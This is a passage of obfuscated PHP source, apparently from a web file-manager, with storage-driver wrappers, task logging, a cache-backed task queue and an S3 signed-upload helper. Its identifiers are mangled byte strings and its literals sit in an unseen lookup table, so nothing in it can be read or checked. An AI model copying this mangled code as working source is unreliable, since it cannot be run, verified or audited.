$·å¤ı°ö[$™˜¥Â·Û[239]]); } return $·‚›©Ÿ© ? $·å¤ı°ö[$™˜¥Â·Û[240]] : $·å¤ı°ö[$™˜¥Â·Û[239]]; } public function listAll($…ı­³»Í) { $Ü¯´¸£è = IO::info($this->pathParse[$_SERVER[£ğ°ÖØø][87]]); if (!$Ü¯´¸£è) { return array(); } return $this->model->listAll($…ı­³»Í); } public function getContent($ä’á²£”) { return $this->model->getContent($ä’á²£”); } public function setContent($‘Óüƒ², $¬ÉêÂÏ = '') { return $this->model->setContent($‘Óüƒ², $¬ÉêÂÏ); } public function fileSubstr($õÊèé¼Ã, $ıá·‰Íø, $»”¡¯×ä) { return $this->model->fileSubstr($õÊèé¼Ã, $ıá·‰Íø, $»”¡¯×ä); } public function download($¤¢±ç‘, $˜ó‚¿‰¹ = '') { $÷ù»Ø‰ñ = get_path_father($˜ó‚¿‰¹); $ı±ÂØ÷ƒ = get_path_this($˜ó‚¿‰¹); $èÔØÀ–€ = $this->model->fileInfoGet($¤¢±ç‘); $Œøõ¨ş‰ = IO::copy($èÔØÀ–€[$_SERVER[£ğ°ÖØø][87]], $÷ù»Ø‰ñ, !1, $ı±ÂØ÷ƒ); return $Œøõ¨ş‰; } public function setModifyTime($ç„½¹Ö, $Â”ôË‡ò = '') { $‡ä™Ã¬© =& $_SERVER[£ğ°ÖØø]; if (!$ç„½¹Ö) { return; } $this->model->where(array($‡ä™Ã¬©[500] => $ç„½¹Ö))->save(array($‡ä™Ã¬©[88] => $Â”ôË‡ò)); } public function upload($šÔ…Š•š, $’øğÃœ³, $©‰Í¨ÈÄ = false, $îŞ·©üÉ = REPEAT_REPLACE) { $…õ—Ö¬Ä =& $_SERVER[£ğ°ÖØø]; $²ïÊë€¥ = $this->parse($šÔ…Š•š); $™µÍß× = $this->model->addFile($²ïÊë€¥[$…õ—Ö¬Ä[484]], $’øğÃœ³, $²ïÊë€¥[$…õ—Ö¬Ä[87]], $©‰Í¨ÈÄ, $îŞ·©üÉ); return $this->getPathOuter($™µÍß×); } public function uploadFileByID($‘è½‰ùò, $ÔĞ¢ä¾Å, $¾·£ëìå) { $ô´—·« =& $_SERVER[£ğ°ÖØø]; $§£—ÁÉÖ = $this->parse($‘è½‰ùò); $§çû™İä = $this->model->addFileByFileID($§£—ÁÉÖ[$ô´—·«[484]], $ÔĞ¢ä¾Å, $§£—ÁÉÖ[$ô´—·«[87]], $¾·£ëìå); return $this->getPathOuter($§çû™İä); } public function addFileByRemote($ÀÒ·…ÊÏ, $ä ¾Ëµ, $Ø©ê“‡£ = array(), $Ô®‹©Àâ = '', $ªÀı£¸) { $É¶Ğàæ± =& $_SERVER[£ğ°ÖØø]; $®á’‰™¶ = $this->parse($ÀÒ·…ÊÏ); $Ô®‹©Àâ = empty($Ô®‹©Àâ) ? $®á’‰™¶[$É¶Ğàæ±[87]] : $Ô®‹©Àâ; $´¤«‡şö = $this->model->addFileByRemote($®á’‰™¶[$É¶Ğàæ±[484]], $ä ¾Ëµ, $Ô®‹©Àâ, $Ø©ê“‡£, $ªÀı£¸); return $this->getPathOuter($´¤«‡şö); } public function uploadLink($ôñ˜ÔÂ¾, $ºüü÷ÑŸ = 0) { $¨ÜãÒÍ =& $_SERVER[£ğ°ÖØø]; $çĞ‚âï‡ = $this->parse($ôñ˜ÔÂ¾); $€ÉİË¢ = _get($GLOBALS[$¨ÜãÒÍ[7]], $¨ÜãÒÍ[1403]); $ÁÛšÆìÜ = _get($GLOBALS[$¨ÜãÒÍ[7]], $¨ÜãÒÍ[1404]); $ôñ˜ÔÂ¾ = Model($¨ÜãÒÍ[683])->createFileName($çĞ‚âï‡[$¨ÜãÒÍ[87]], $€ÉİË¢, $ÁÛšÆìÜ); return IO::uploadLink($ôñ˜ÔÂ¾, $ºüü÷ÑŸ); } public function fileNameAuto($«ßÆæ¢º, $ğ¡„´´”, $Ë·Ë´ªŸ = REPEAT_REPLACE, $ÂŸ€ëï¼ = false) { return $this->model->fileNameAuto($«ßÆæ¢º, $ğ¡„´´”, $Ë·Ë´ªŸ, $ÂŸ€ëï¼); } public function fileNameExist($¯›¨èı³, $àáşª¡) { return $this->model->fileNameExist($¯›¨èı³, $àáşª¡); } protected function _fileOut($ËÊÃªßù, $ºãØ¸“› = false, $è¦ƒÕó = false, $Ğøî = '', $†³‚×šÈ = false) { $ñÕÒ÷š¬ =& $_SERVER[£ğ°ÖØø]; $ñÈ…»œ = $this->model->sourceInfo($ËÊÃªßù); if ($ñÈ…»œ[$ñÕÒ÷š¬[494]] == $ñÕÒ÷š¬[91]) { header($ñÕÒ÷š¬[1405]); die; } $Î°”öÕŒ = $this->model->fileInfoGet($ËÊÃªßù); $Ğøî = $Î°”öÕŒ[$ñÕÒ÷š¬[556]] ? $Î°”öÕŒ[$ñÕÒ÷š¬[556]] : $Ğøî; $®ÙÛ¨çÛ = isset($GLOBALS[$ñÕÒ÷š¬[182]]) && is_array($GLOBALS[$ñÕÒ÷š¬[182]]) ? $GLOBALS[$ñÕÒ÷š¬[182]][$ñÕÒ÷š¬[32]] : $ñÈ…»œ[$ñÕÒ÷š¬[32]]; if ($†³‚×šÈ) { return IO::fileOutServer($Î°”öÕŒ[$ñÕÒ÷š¬[87]], $ºãØ¸“›, $®ÙÛ¨çÛ, $Ğøî); } IO::fileOut($Î°”öÕŒ[$ñÕÒ÷š¬[87]], $ºãØ¸“›, $®ÙÛ¨çÛ, $Ğøî); } public function fileOut($ä†èØÄ‚, $…Äõ¢œ = false, $ß¨ıÅ¹„ = false, $‹–˜úõä = '') { $this->_fileOut($ä†èØÄ‚, $…Äõ¢œ, $ß¨ıÅ¹„, $‹–˜úõä); } public function fileOutServer($´ŠÚ¥òø, $™÷ÁÍâ = false, $È¯İŠù = false, $ñÎ»°âÛ = '') { $this->_fileOut($´ŠÚ¥òø, $™÷ÁÍâ, $È¯İŠù, $ñÎ»°âÛ, !0); } protected function _fileOutImage($ªÍä´ Œ, $Ô¯Û ¨Ô = 250) { $äêò’§á =& $_SERVER[£ğ°ÖØø]; $ö¢¤´²¢ = $this->model->pathInfo($ªÍä´ Œ); if ($ö¢¤´²¢[$äêò’§á[494]] == $äêò’§á[91]) { show_json($äêò’§á[1406] . $ªÍä´ Œ, !1); } $×«Î²½ö = $this->model->fileInfoGet($ªÍä´ Œ); $ö¢¤´²¢[$äêò’§á[183]] = $×«Î²½ö[$äêò’§á[87]]; $GLOBALS[$äêò’§á[182]] = $ö¢¤´²¢; IO::fileOutImage($×«Î²½ö[$äêò’§á[87]], $Ô¯Û ¨Ô); } public function fileOutImage($ÌáÈİóÚ, $ÒÆµƒˆ˜ = 250) { $this->_fileOutImage($ÌáÈİóÚ, $ÒÆµƒˆ˜); } public function fileOutImageServer($íıóÊ¼Ï, $¶é¼÷À = 250) { $this->_fileOutImage($íıóÊ¼Ï, $¶é¼÷À); } public function link($¬ÉÖŞ‡†, $»”ı«’ = '') { $òÚÑ÷Üı = $this->model->fileInfoGet($¬ÉÖŞ‡†); return IO::link($òÚÑ÷Üı[$_SERVER[£ğ°ÖØø][87]], $»”ı«’); } protected function parse($¼ªÉÉı¡) { $”©õÈ‹À =& $_SERVER[£ğ°ÖØø]; if (strstr($¼ªÉÉı¡, $”©õÈ‹À[8]) === !1) { return array($”©õÈ‹À[502] => intval($¼ªÉÉı¡), $”©õÈ‹À[87] => $”©õÈ‹À[12], $”©õÈ‹À[1402] => array()); } $ÎÎê“ú’ = explode($”©õÈ‹À[8], trim($¼ªÉÉı¡, $”©õÈ‹À[8])); if (count($ÎÎê“ú’) < 2) { show_tips(clear_html($¼ªÉÉı¡) . $”©õÈ‹À[1407]); } return array($”©õÈ‹À[502] => intval($ÎÎê“ú’[0]), $”©õÈ‹À[87] => $ÎÎê“ú’[1], $”©õÈ‹À[1402] => array_slice($ÎÎê“ú’, 1)); } } goto Cï©‘âİ£•; E»¨äĞÓ÷: class TaskHttp extends Task { protected function startAfter() { $Éòú¼Ë° =& $_SERVER[£ğ°ÖØø]; $Ïó‚­ó® =& $this->task; $Ïó‚­ó®[$Éòú¼Ë°[1832]] = 1; Hook::bind($Éòú¼Ë°[1800], array($this, $Éòú¼Ë°[1833])); Hook::bind($Éòú¼Ë°[1802], array($this, $Éòú¼Ë°[1834])); Hook::bind($Éòú¼Ë°[1804], array($this, $Éòú¼Ë°[1835])); } protected function endAfter() { $ûí¦ıèÌ =& $_SERVER[£ğ°ÖØø]; Hook::unbind($ûí¦ıèÌ[1800], array($this, $ûí¦ıèÌ[1833])); Hook::unbind($ûí¦ıèÌ[1802], array($this, $ûí¦ıèÌ[1834])); Hook::unbind($ûí¦ıèÌ[1804], array($this, $ûí¦ıèÌ[1835])); } public function progressStart($Õ¶¢¬) { $¢ÄšëŸÇ =& $_SERVER[£ğ°ÖØø]; $¶ŒÕÊÕ = curl_getinfo($Õ¶¢¬); self::log($¢ÄšëŸÇ[1836] . $¶ŒÕÊÕ[$¢ÄšëŸÇ[383]]); self::valueSet($this->task[$¢ÄšëŸÇ[484]], $this->task); } public function progressEnd($äúÃ´Õ¤) { $âÌÕ·¥ =& $_SERVER[£ğ°ÖØø]; self::log($âÌÕ·¥[1837] . $this->task[$âÌÕ·¥[484]]); $this->end(); } public function progress($ÏÓ¥ìÒÊ, $úŸ±, $½±÷òÜ, $ı†®ƒŞ…, $£çÜİ—ø) { $ê—ö£á­ =& $_SERVER[£ğ°ÖØø]; $ƒ—î¡Ó =& $this->task; if ($£çÜİ—ø > 0) { $ƒ—î¡Ó[$ê—ö£á­[1124]] = $ƒ—î¡Ó[$ê—ö£á­[1124]] == 0 ? $ı†®ƒŞ… : $ƒ—î¡Ó[$ê—ö£á­[1124]]; $ƒ—î¡Ó[$ê—ö£á­[1756]] = $£çÜİ—ø; } else { if ($½±÷òÜ > 0) { $ƒ—î¡Ó[$ê—ö£á­[1124]] = $ƒ—î¡Ó[$ê—ö£á­[1124]] == 0 ? $úŸ± : $ƒ—î¡Ó[$ê—ö£á­[1124]]; $ƒ—î¡Ó[$ê—ö£á­[1756]] = $½±÷òÜ; } } $this->update(); self::log("\160\162\157\147\162\x65\163\163\110\164\x74\160\72\x64\x6f\x77\x6e\72{$½±÷òÜ}\57{$úŸ±}\73\40\165\x70\x6c\157\x61\144\72{$£çÜİ—ø}\x2f{$ı†®ƒŞ…}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ü¡³ÔıÂ, $Š££©Å† = '', $ÁóÈÜÅ = 0, $ÙÜ¸œÑĞ = '') { $áË«”ˆ =& $_SERVER[£ğ°ÖØø]; $ÙÜ¸œÑĞ = $ÙÜ¸œÑĞ ? $ÙÜ¸œÑĞ : ($Š££©Å† ? $Š££©Å† : $Ü¡³ÔıÂ); $üõùÆµ„ = new Task($Ü¡³ÔıÂ, $Š££©Å†, $ÁóÈÜÅ, $ÙÜ¸œÑĞ); $GLOBALS[$áË«”ˆ[1838] . $Ü¡³ÔıÂ] = new TaskLog($áË«”ˆ[1739], $üõùÆµ„, $ÙÜ¸œÑĞ); return $üõùÆµ„; } public function __construct($Ë†õŒï— = '', $ë™­µÒ– = '', $ƒ÷à¨ëØ = '') { $ƒò“şè± =& $_SERVER[£ğ°ÖØø]; if (!$Ë†õŒï—) { $Ë†õŒï— = $ƒò“şè±[1739]; } $Á´âµšÆ = $Ë†õŒï— . $ƒò“şè±[471] . rand_string(10); if (!$ƒ÷à¨ëØ) { $ƒ÷à¨ëØ = $Ë†õŒï— . $ƒò“şè±[53] . $ƒ÷à¨ëØ; } switch ($Ë†õŒï—) { case $ƒò“şè±[1739]: if (!$ë™­µÒ– || !$ë™­µÒ–->task) { return echoLog($Ë†õŒï— . $ƒò“şè±[1839]); } $¼ìÇ»Ê˜ = $ë™­µÒ–; $Á´âµšÆ = $¼ìÇ»Ê˜->task[$ƒò“şè±[484]]; $Ë†õŒï— = $¼ìÇ»Ê˜->task[$ƒò“şè±[484]]; if (!$¼ìÇ»Ê˜->task[$ƒò“şè±[1642]]) { $¼ìÇ»Ê˜->task[$ƒò“şè±[1642]] = $ƒ÷à¨ëØ ? $ƒ÷à¨ëØ : $Ë†õŒï—; } break; case $ƒò“şè±[1840]: if (!$ë™­µÒ–) { return echoLog($Ë†õŒï— . $ƒò“şè±[1841]); } $´ôñ°Ôà = is_string($ë™­µÒ–) ? array($ë™­µÒ–) : $ë™­µÒ–; $¼ìÇ»Ê˜ = new TaskFileTransfer($Á´âµšÆ, $Ë†õŒï—, 0, $ƒ÷à¨ëØ ? $ƒ÷à¨ëØ : $´ôñ°Ôà[0]); foreach ($´ôñ°Ôà as $ëàÀÑ³Ğ) { $¼ìÇ»Ê˜->addPath($ëàÀÑ³Ğ); } break; case $ƒò“şè±[389]: if (!$ë™­µÒ–) { return echoLog($Ë†õŒï— . $ƒò“şè±[1841]); } $´ôñ°Ôà = is_string($ë™­µÒ–) ? array($ë™­µÒ–) : $ë™­µÒ–; $¼ìÇ»Ê˜ = new TaskZip($Á´âµšÆ, $Ë†õŒï—, 0, $ƒ÷à¨ëØ ? $ƒ÷à¨ëØ : $´ôñ°Ôà[0]); foreach ($´ôñ°Ôà as $ëàÀÑ³Ğ) { $¼ìÇ»Ê˜->addPath($ëàÀÑ³Ğ); } break; case $ƒò“şè±[1282]: if (!$ë™­µÒ–) { return echoLog($Ë†õŒï— . $ƒò“şè±[1841]); } $¼ìÇ»Ê˜ = new TaskUnZip($Á´âµšÆ, $Ë†õŒï—, 0, $ƒ÷à¨ëØ ? $ƒ÷à¨ëØ : $ë™­µÒ–); if ($ë™­µÒ–) { $¼ìÇ»Ê˜->addFile($ë™­µÒ–); } break; case $ƒò“şè±[152]: $¼ìÇ»Ê˜ = new TaskHttp($Á´âµšÆ, $Ë†õŒï—); break; default: return; break; } $this->task = $¼ìÇ»Ê˜; $this->taskID = $Á´âµšÆ; Hook::bind($ƒò“şè±[1776], array($this, $ƒò“şè±[1842])); Hook::bind($ƒò“şè±[1778], array($this, $ƒò“şè±[1843])); Hook::bind($ƒò“şè±[1772], array($this, $ƒò“şè±[1844])); echoLog($ƒò“şè±[1845] . $¼ìÇ»Ê˜->task[$ƒò“şè±[1642]]); } public function __destruct() { $this->end(); } public function end($Ù‡›ó½ = '') { $Ï«Ïóè =& $_SERVER[£ğ°ÖØø]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ù‡›ó½); $this->task = !1; $this->taskID = !1; Hook::unbind($Ï«Ïóè[1776], array($this, $Ï«Ïóè[1842])); Hook::unbind($Ï«Ïóè[1778], array($this, $Ï«Ïóè[1843])); Hook::unbind($Ï«Ïóè[1772], array($this, $Ï«Ïóè[1844])); } public function taskUpdate($‡İÒ™…) { $Õš˜¢ßè =& $_SERVER[£ğ°ÖØø]; if (!$‡İÒ™… || $this->taskID != $‡İÒ™…[$Õš˜¢ßè[484]]) { return; } $Óïâ¿×¶ = 20; $·õ×áå’ = intval($‡İÒ™…[$Õš˜¢ßè[1757]] * $Óïâ¿×¶); $–²û¦Ÿ = $Õš˜¢ßè[176] . str_repeat($Õš˜¢ßè[945], $·õ×áå’) . $Õš˜¢ßè[1075] . str_repeat($Õš˜¢ßè[53], $Óïâ¿×¶ - $·õ×áå’) . $Õš˜¢ßè[178]; $½è ™ ô = $–²û¦Ÿ . sprintf($Õš˜¢ßè[1846], $‡İÒ™…[$Õš˜¢ßè[1757]] * 100) . $Õš˜¢ßè[1847]; $¬æ¥›–ü = $½è ™ ô . $‡İÒ™…[$Õš˜¢ßè[1756]] . $Õš˜¢ßè[8] . $‡İÒ™…[$Õš˜¢ßè[1124]] . LNG($Õš˜¢ßè[1848]); $ö¥Å¸Ù„ = $Õš˜¢ßè[12]; if ($‡İÒ™…[$Õš˜¢ßè[1832]]) { $¬æ¥›–ü = $½è ™ ô . size_format($‡İÒ™…[$Õš˜¢ßè[1756]]) . $Õš˜¢ßè[8] . size_format($‡İÒ™…[$Õš˜¢ßè[1124]]); $ö¥Å¸Ù„ = size_format($‡İÒ™…[$Õš˜¢ßè[1758]]) . $Õš˜¢ßè[1849]; } if ($‡İÒ™…[$Õš˜¢ßè[1126]]) { $‡İÒ™…[$Õš˜¢ßè[1806]] = $‡İÒ™…[$Õš˜¢ßè[1126]] . $Õš˜¢ßè[53] . $‡İÒ™…[$Õš˜¢ßè[1806]]; } if ($‡İÒ™…[$Õš˜¢ßè[1806]]) { $æ–æ¤ë = $Õš˜¢ßè[12]; if ($‡İÒ™…[$Õš˜¢ßè[1808]]) { $æ–æ¤ë = $Õš˜¢ßè[50] . size_format($‡İÒ™…[$Õš˜¢ßè[1809]]) . $Õš˜¢ßè[8] . size_format($‡İÒ™…[$Õš˜¢ßè[1808]]); } $ö¥Å¸Ù„ .= $‡İÒ™…[$Õš˜¢ßè[1806]] . $æ–æ¤ë; } if ($‡İÒ™…[$Õš˜¢ßè[827]] && !$‡İÒ™…[$Õš˜¢ßè[1808]]) { $ö¥Å¸Ù„ .= $Õš˜¢ßè[53] . size_format($‡İÒ™…[$Õš˜¢ßè[1813]]) . $Õš˜¢ßè[8] . size_format($‡İÒ™…[$Õš˜¢ßè[827]]); } echoLog($¬æ¥›–ü . $Õš˜¢ßè[53] . $ö¥Å¸Ù„, !0); } public function taskEnd($€ ˜·ÇĞ) { $¡É•Ê… =& $_SERVER[£ğ°ÖØø]; if (!$€ ˜·ÇĞ || $this->taskID != $€ ˜·ÇĞ[$¡É•Ê…[484]]) { return; } $ÉÃøãŸİ = $€ ˜·ÇĞ ? $€ ˜·ÇĞ[$¡É•Ê…[1756]] . $¡É•Ê…[8] . $€ ˜·ÇĞ[$¡É•Ê…[1124]] . LNG($¡É•Ê…[1848]) . $¡É•Ê…[74] : $¡É•Ê…[12]; echoLog($¡É•Ê…[1850] . $€ ˜·ÇĞ[$¡É•Ê…[1642]] . ($€ ˜·ÇĞ[$¡É•Ê…[535]] ? $¡É•Ê…[74] . $€ ˜·ÇĞ[$¡É•Ê…[535]] : $¡É•Ê…[12]) . $¡É•Ê…[74] . $ÉÃøãŸİ . $¡É•Ê…[1851] . sprintf($¡É•Ê…[914], timeFloat() - $€ ˜·ÇĞ[$¡É•Ê…[1759]]) . $¡É•Ê…[1771]); $this->end(); } public function taskKill($·ã•©…) { $Ó³éşÊ” =& $_SERVER[£ğ°ÖØø]; if (!$·ã•©… || $this->taskID != $·ã•©…[$Ó³éşÊ”[484]]) { return; } echoLog($Ó³éşÊ”[1852] . $·ã•©…[$Ó³éşÊ”[1642]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\121\165\145\165\x65\x4c\x65\156\147\x74\x68"; const QUEUE_DATA = "\164\141\163\153\121\x75\x65\165\x65\104\x61\x74\x61"; const QUEUE_TIME = "\x74\141\x73\153\x51\165\145\x75\x65\x4c\141\163\x74\x52\165\x6e"; const QUEUE_THREAD = "\164\x61\163\x6b\x51\165\x65\165\x65\124\x68\162\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÂĞÚÃù×, $óİíÃõ  = array(), $¡äÂÙß = '', $“È–”ôª = '') { $Œî¡åîö =& $_SERVER[£ğ°ÖØø]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($“È–”ôª && array_find_by_field(self::$listData, $Œî¡åîö[97], $“È–”ôª)) { return !0; } if ($“È–”ôª && array_find_by_field(self::$listDataAdd, $Œî¡åîö[97], $“È–”ôª)) { return !0; } self::$listDataAdd[] = array($Œî¡åîö[341] => $ÂĞÚÃù×, $Œî¡åîö[1853] => $óİíÃõ , $Œî¡åîö[535] => $¡äÂÙß, $Œî¡åîö[97] => $“È–”ôª); return !0; } public static function addSubmit() { $®€Ö¨ ˆ =& $_SERVER[£ğ°ÖØø]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($®€Ö¨ ˆ[1854] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $®€Ö¨ ˆ[12], $®€Ö¨ ˆ[535])), $®€Ö¨ ˆ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ñïîÍñ, $˜˜ğœ¬ = array(), $÷¯Ô¤Æ† = '', $öŞ±œÑû = '') { $¹º—­¦å =& $_SERVER[£ğ°ÖØø]; if (self::count() >= self::MAX_LENGTH) { return !1; } $²‹¶û®‘ = self::getAll(); if ($öŞ±œÑû && array_find_by_field($²‹¶û®‘, $¹º—­¦å[97], $öŞ±œÑû)) { return !0; } $²‹¶û®‘[] = array($¹º—­¦å[341] => $ñïîÍñ, $¹º—­¦å[1853] => $˜˜ğœ¬, $¹º—­¦å[535] => $÷¯Ô¤Æ†, $¹º—­¦å[97] => $öŞ±œÑû); self::setAll($²‹¶û®‘); write_log($¹º—­¦å[1854] . $÷¯Ô¤Æ†, $¹º—­¦å[197]); return !0; } public static function run() { $™‚ì»Ú¶ =& $_SERVER[£ğ°ÖØø]; $¬òı€  = self::getAll(); $şÁƒ¦ÇÍ = array_shift($¬òı€ ); if (!$şÁƒ¦ÇÍ) { return !1; } self::setAll($¬òı€ ); $¡ôşÚ­¼ = timeFloat(); $ï‘´¤áÒ = $™‚ì»Ú¶[12]; try { $ï‘´¤áÒ = Hook::apply($şÁƒ¦ÇÍ[$™‚ì»Ú¶[341]], $şÁƒ¦ÇÍ[$™‚ì»Ú¶[1853]]); } catch (Exception $œÎ³•ò‚) { write_log($œÎ³•ò‚, $™‚ì»Ú¶[1247]); } $Ëß¬Í°­ = number_format(timeFloat() - $¡ôşÚ­¼, 3) . $™‚ì»Ú¶[1771]; if ($ï‘´¤áÒ && is_string($ï‘´¤áÒ)) { $Ëß¬Í°­ = $Ëß¬Í°­ . $™‚ì»Ú¶[1855] . $ï‘´¤áÒ; } write_log($™‚ì»Ú¶[1856] . $şÁƒ¦ÇÍ[$™‚ì»Ú¶[535]] . $™‚ì»Ú¶[1857] . $Ëß¬Í°­, $™‚ì»Ú¶[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ç€©ğËÑ =& $_SERVER[£ğ°ÖØø]; $¤µÅ‹ÉÉ = self::threadCount() + 1; if ($¤µÅ‹ÉÉ > 3 || !self::count()) { return; } write_log($Ç€©ğËÑ[1858] . $¤µÅ‹ÉÉ, $Ç€©ğËÑ[197]); Cache::set(self::QUEUE_THREAD, $¤µÅ‹ÉÉ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ç€©ğËÑ[1859], $Ç€©ğËÑ[197]); } public static function getKey($Í¬êŒ†Ç, $’²£­™Î = "\x69\156\x74") { $–Ÿ˜ˆûÅ =& $_SERVER[£ğ°ÖØø]; Cache::removeMemory($Í¬êŒ†Ç); $’ˆ¢ = Cache::get($Í¬êŒ†Ç); if ($’²£­™Î == $–Ÿ˜ˆûÅ[364]) { return $’ˆ¢ ? intval($’ˆ¢) : 0; } if ($’²£­™Î == $–Ÿ˜ˆûÅ[1860]) { return is_array($’ˆ¢) ? $’ˆ¢ : array(); } return $’ˆ¢; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[£ğ°ÖØø][1860]); } public static function setAll($¼«Ÿõ™­) { $²¿²±ş½ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¼«Ÿõ™­), $²¿²±ş½); Cache::set(self::QUEUE_DATA, $¼«Ÿõ™­, $²¿²±ş½); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto B»å•†İ; Fâô¯ÉËİ³: define($_SERVER[£ğ°ÖØø][317], 3); define($_SERVER[£ğ°ÖØø][318], 1); define($_SERVER[£ğ°ÖØø][319], 0); goto fĞ¿“§µ½ª; dÎÁ†Û÷°Á: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¡èËÃıÖ) { parent::__construct($¡èËÃıÖ); } public function uploadFormData($÷ºÜ’§ç, $É«Ëš·Ã = 3600) { $íš€¢ùÔ =& $_SERVER[£ğ°ÖØø]; $ßÆóÌ = $íš€¢ùÔ[229]; $Ş¡À£§ô = $íš€¢ùÔ[270]; $Û’’Ä‹‘ = $íš€¢ùÔ[62]; $İ°Êîóô = gmdate($íš€¢ùÔ[271]); $Õ“ùïÜÊ = gmdate($íš€¢ùÔ[272]); $şÁ“¿¦ = $íš€¢ùÔ[273]; $«±ãÄöî = $É«Ëš·Ã . $íš€¢ùÔ[12]; $ñ¼”óé = $íš€¢ùÔ[274]; $¼ „«„Œ = array($this->accessKey, $Õ“ùïÜÊ, $this->region, $Û’’Ä‹‘, $şÁ“¿¦); $´Ğ¯ì…“ = implode($íš€¢ùÔ[8], $¼ „«„Œ); $ŸÈ®×¹ø = array($íš€¢ùÔ[275] => gmdate($íš€¢ùÔ[299], strtotime($íš€¢ùÔ[277])), $íš€¢ùÔ[278] => array(array($íš€¢ùÔ[279] => $this->bucket), array($íš€¢ùÔ[280] => $ßÆóÌ), array($íš€¢ùÔ[281], $íš€¢ùÔ[282], $íš€¢ùÔ[12]), array($íš€¢ùÔ[281], $íš€¢ùÔ[283], $íš€¢ùÔ[12]), array($íš€¢ùÔ[281], $íš€¢ùÔ[284], $íš€¢ùÔ[12]), array($íš€¢ùÔ[285] => $ñ¼”óé), array($íš€¢ùÔ[286] => $´Ğ¯ì…“), array($íš€¢ùÔ[287] => $Ş¡À£§ô), array($íš€¢ùÔ[288] => $İ°Êîóô), array($íš€¢ùÔ[289] => $«±ãÄöî))); $ËÛè£Ğğ = base64_encode(json_encode($ŸÈ®×¹ø)); $€ÈüõÂ = hash_hmac($íš€¢ùÔ[290], $Õ“ùïÜÊ, $íš€¢ùÔ[291] . $this->secret, !0); $„·ôÀâì = hash_hmac($íš€¢ùÔ[290], $this->region, $€ÈüõÂ, !0); $®Ï˜‰ ¶ = hash_hmac($íš€¢ùÔ[290], $Û’’Ä‹‘, $„·ôÀâì, !0); $êúÖßŠ„ = hash_hmac($íš€¢ùÔ[290], $şÁ“¿¦, $®Ï˜‰ ¶, !0); $êÅ‚¨ğß = hash_hmac($íš€¢ùÔ[290], $ËÛè£Ğğ, $êúÖßŠ„); $¼ßª˜ = array($íš€¢ùÔ[246] => $íš€¢ùÔ[12], $íš€¢ùÔ[292] => $íš€¢ùÔ[12], $íš€¢ùÔ[280] => $ßÆóÌ, $íš€¢ùÔ[285] => $ñ¼”óé, $íš€¢ùÔ[293] => $ËÛè£Ğğ, $íš€¢ùÔ[294] => $´Ğ¯ì…“, $íš€¢ùÔ[295] => $Ş¡À£§ô, $íš€¢ùÔ[296] => $İ°Êîóô, $íš€¢ùÔ[297] => $«±ãÄöî, $íš€¢ùÔ[298] => $êÅ‚¨ğß, $íš€¢ùÔ[208] => $this->getHost()); return $¼ßª˜; } public function multiUploadFormData($¬Ö­ÄÎĞ, $ö‰€›Ö³ = 3600) { $ÖÑ±´‹ö =& $_SERVER[£ğ°ÖØø]; $ÏıªÂ´ = gmdate($ÖÑ±´‹ö[300]); $ğá†‡ç = array(); $œá«úÍá = $this->client->getUploadId($this->bucket, $¬Ö­ÄÎĞ, $ğá†‡ç); if (!$œá«úÍá) { return !1; } return array($ÖÑ±´‹ö[254] => $œá«úÍá, $ÖÑ±´‹ö[208] => $this->getHost() . $ÖÑ±´‹ö[8] . $this->pathEncode($¬Ö­ÄÎĞ), $ÖÑ±´‹ö[255] => $ÏıªÂ´, $ÖÑ±´‹ö[97] => $¬Ö­ÄÎĞ); } public function multiUploadAuthData($¯©î¼¯, $±ø¡´ş  = array()) { $ôı©ø§¦ =& $_SERVER[£ğ°ÖØø]; $ÆƒìßÉÌ = isset($±ø¡´ş [$ôı©ø§¦[169]]) ? $±ø¡´ş [$ôı©ø§¦[169]] : $ôı©ø§¦[12]; $‚–ûÜá = $±ø¡´ş [$ôı©ø§¦[97]]; unset($±ø¡´ş [$ôı©ø§¦[97]]); if (isset($±ø¡´ş [$ôı©ø§¦[256]])) { return $this->listUploadParts($‚–ûÜá, $±ø¡´ş ); } $“Èò±æ‡ = array(); if (isset($±ø¡´ş [$ôı©ø§¦[301]])) { $“Èò±æ‡[$ôı©ø§¦[302]] = $±ø¡´ş [$ôı©ø§¦[301]]; } $Ò£—â¼ = explode($ôı©ø§¦[210], $this->getHost()); $¿áùûï = array($ôı©ø§¦[303] => $Ò£—â¼[1], $ôı©ø§¦[304] => $ôı©ø§¦[12], $ôı©ø§¦[246] => $ôı©ø§¦[123], $ôı©ø§¦[292] => $±ø¡´ş [$ôı©ø§¦[79]]); $úœˆƒÜÙ = $ôı©ø§¦[259]; $‚©•°•ƒ = $ôı©ø§¦[8] . $this->pathEncode($‚–ûÜá) . $ÆƒìßÉÌ; $×ßÕìûğ = $this->client->__getSignatureV4($“Èò±æ‡, $¿áùûï, $úœˆƒÜÙ, $‚©•°•ƒ); if (strpos($ÆƒìßÉÌ, $ôı©ø§¦[258]) === 0) { if (isset($“Èò±æ‡[$ôı©ø§¦[302]])) { $ñóÜÜ å = $“Èò±æ‡[$ôı©ø§¦[302]]; } else { if (isset($×ßÕìûğ[$ôı©ø§¦[302]])) { $ñóÜÜ å = $×ßÕìûğ[$ôı©ø§¦[302]]; } else { $ñóÜÜ å = 